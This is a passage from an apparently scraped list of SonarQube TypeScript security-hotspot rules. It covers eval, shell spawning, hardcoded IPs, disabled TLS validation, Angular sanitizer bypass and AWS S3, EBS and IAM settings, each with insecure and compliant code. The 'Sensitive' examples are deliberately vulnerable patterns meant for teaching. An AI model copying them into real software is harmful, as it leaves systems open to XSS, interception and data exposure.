same way as calls to <code>eval</code> or <code>Function</code> constructor.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>
  <li> you really need to run code dynamically. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager">Security Managers</a> in java, <a
href="https://www.w3schools.com/tags/att_iframe_sandbox.asp">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
let value = eval('obj.' + propName); // Sensitive
let func = Function('obj' + propName); // Sensitive
location.href = 'javascript:void(0)'; // Sensitive
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably
safe.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4721">
              typescript:S4721
            </a>
          </td>
          <td>
            <details>
              <p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> OS command name or parameters are user-controlled. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp = require('child_process');

// A shell will be spawn in these following cases:
cp.exec(cmd); // Sensitive
cp.execSync(cmd); // Sensitive

cp.spawn(cmd, { shell: true }); // Sensitive
cp.spawnSync(cmd, { shell: true }); // Sensitive
cp.execFile(cmd, { shell: true }); // Sensitive
cp.execFileSync(cmd, { shell: true }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp = require('child_process');

cp.spawnSync("/usr/bin/file.exe", { shell: false }); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S1313">
              typescript:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip = "192.168.12.42"; // Sensitive

const net = require('net');
var client = new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
ip = process.env.IP_ADDRESS; // Compliant

const net = require('net');
var client = new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID). </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the 2001:db8::/32 range, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4829">
              typescript:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337">CVE-2005-2337</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
// All uses of process.stdin are security-sensitive and should be reviewed

process.stdin.on('readable', () =&gt; {
	const chunk = process.stdin.read(); // Sensitive
	if (chunk !== null) {
		dosomething(chunk);
	}
});

const readline = require('readline');
readline.createInterface({
	input: process.stdin // Sensitive
}).on('line', (input) =&gt; {
	dosomething(input);
});
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4823">
              typescript:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281">CVE-2018-7281</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326">CVE-2018-12326</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
var param = process.argv[2]; // Sensitive: check how the argument is used
console.log('Param: ' + param);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/214">CWE-214 - Information Exposure Through Process Environment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4830">
              typescript:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by setting <code>rejectUnauthorized</code> to <code>false</code>. To enable validation set the value to
<code>true</code> or do not set <code>rejectUnauthorized</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  rejectUnauthorized: false,
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
}); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls = require('node:tls');

let options = {
    rejectUnauthorized: false,
    secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
}); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls = require('node:tls');

let options = {
    secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6268">
              typescript:S6268
            </a>
          </td>
          <td>
            <details>
              <p>Angular prevents XSS vulnerabilities by treating all values as untrusted by default. Untrusted values are systematically sanitized by the framework
before they are inserted into the DOM.</p>
<p>Still, developers have the ability to manually mark a value as trusted if they are sure that the value is already sanitized. Accidentally trusting
malicious data will introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive
information or impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The value for which sanitization has been disabled is user-controlled. </li>
  <li> It’s difficult to understand how this value is constructed. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid including dynamic executable code and thus disabling Angular’s built-in sanitization unless it’s absolutely necessary. Try instead to
  rely as much as possible on static templates and Angular built-in sanitization to define web page content. </li>
  <li> Make sure to understand how the value to consider as trusted is constructed and never concatenate it with user-controlled data. </li>
  <li> Make sure to choose the correct <a href="https://angular.io/api/platform-browser/DomSanitizer">DomSanitizer</a> "bypass" method based on the
  context. For instance, only use <code>bypassSecurityTrustUrl</code> to trust urls in an <code>href</code> attribute context. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import { Component, OnInit } from '@angular/core';
import { DomSanitizer, SafeHtml } from "@angular/platform-browser";
import { ActivatedRoute } from '@angular/router';

@Component({
  template: '&lt;div id="hello" [innerHTML]="hello"&gt;&lt;/div&gt;'
})
export class HelloComponent implements OnInit {
  hello: SafeHtml;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    let name = this.route.snapshot.queryParams.name;
    let html = "&lt;h1&gt;Hello " + name + "&lt;/h1&gt;";
    this.hello = this.sanitizer.bypassSecurityTrustHtml(html); // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import { Component, OnInit } from '@angular/core';
import { DomSanitizer } from "@angular/platform-browser";
import { ActivatedRoute } from '@angular/router';

@Component({
  template: '&lt;div id="hello"&gt;&lt;h1&gt;Hello {{name}}&lt;/h1&gt;&lt;/div&gt;',
})
export class HelloComponent implements OnInit {
  name: string;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    this.name = this.route.snapshot.queryParams.name;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
  <li> <a href="https://angular.io/guide/security">Angular - Best Practices - Security</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6265">
              typescript:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul>
  <li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively "read" and "read and write" privileges to anyone, either
  authenticated or anonymous (<code>AllUsers</code> group). </li>
  <li> <code>AUTHENTICATED_READ</code> grants "read" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, i.e., to only grant users the necessary permissions for their required tasks. In the
context of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users, either authenticated or anonymous, have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access control:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'bucket', {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});

new s3deploy.BucketDeployment(this, 'DeployWebsite', {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the bucket and its ACL.</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'bucket', {
    accessControl: s3.BucketAccessControl.PRIVATE
});

new s3deploy.BucketDeployment(this, 'DeployWebsite', {
    accessControl: s3.BucketAccessControl.PRIVATE
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html">AWS CDK version 2</a> - Class Bucket (construct) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6275">
              typescript:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a
href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The disk contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from 'aws-cdk-lib';
import { Volume } from 'aws-cdk-lib/aws-ec2';

new Volume(this, 'unencrypted-explicit', {
      availabilityZone: 'us-west-2a',
      size: Size.gibibytes(1),
      encrypted: false // Sensitive
    });
</pre>
<pre>
import { Size } from 'aws-cdk-lib';
import { Volume } from 'aws-cdk-lib/aws-ec2';

new Volume(this, 'unencrypted-implicit', {
      availabilityZone: 'eu-west-1a',
      size: Size.gibibytes(1),
    }); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from 'aws-cdk-lib';
import { Volume } from 'aws-cdk-lib/aws-ec2';

new Volume(this, 'encrypted-explicit', {
      availabilityZone: 'eu-west-1a',
      size: Size.gibibytes(1),
      encrypted: true
    });
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html">Amazon EBS encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6270">
              typescript:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The AWS resource stores or processes sensitive data. </li>
  <li> The AWS resource is designed to be private. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'
import { aws_s3 as s3 } from 'aws-cdk-lib'

const bucket = new s3.Bucket(this, "ExampleBucket")

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["s3:*"],
    resources: [bucket.arnForObjects("*")],
    principals: [new iam.AnyPrincipal()] // Sensitive
}))
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'
import { aws_s3 as s3 } from 'aws-cdk-lib'

const bucket = new s3.Bucket(this, "ExampleBucket")

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["s3:*"],
    resources: [bucket.arnForObjects("*")],
    principals: [new iam.AccountRootPrincipal()]
}))
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6249">
              typescript:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enforce HTTPS only access by setting <code>enforceSSL</code> property to <code>true</code></p>
<h2>Sensitive Code Example</h2>
<p>S3 bucket objects access through TLS is not enforced by default:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

const bucket = new s3.Bucket(this, 'example'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

const bucket = new s3.Bucket(this, 'example', {
    bucketName: 'example',
    versioned: true,
    publicReadAccess: false,
    enforceSSL: true
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit">AWS documentation</a> - Enforce encryption
  of data in transit </li>
  <li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html">AWS CDK version 2</a> - Bucket </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6245">
              typescript:S6245
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul>
  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul>
      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul>
      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul>
      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li>
    </ul>  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'default'
}); // Sensitive
</pre>
<p>Bucket encryption is disabled by default.</p>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
